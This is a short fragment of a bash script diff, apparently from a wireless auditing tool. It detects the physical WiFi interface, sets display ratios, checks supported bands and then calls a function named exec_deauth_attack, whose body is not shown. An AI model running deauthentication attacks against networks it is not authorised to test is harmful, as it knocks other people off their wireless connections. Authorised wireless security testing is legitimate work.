+	phy_interface=$(physical_interface_finder "${interface}")
+	echo "[*] Physical interface detected: ${phy_interface}"
+fi
+
+echo "[*] Detecting distro window ratios..."
+detect_distro_window_ratios
+echo "[*] Window ratios set (xratio=${xratio}, yratio=${yratio})"
+
+echo "[*] Checking interface band support..."
+check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
+echo "[*] Interface band: ${interfaces_band_info[main_wifi_interface,text]}"
+echo
+
+exec_deauth_attack
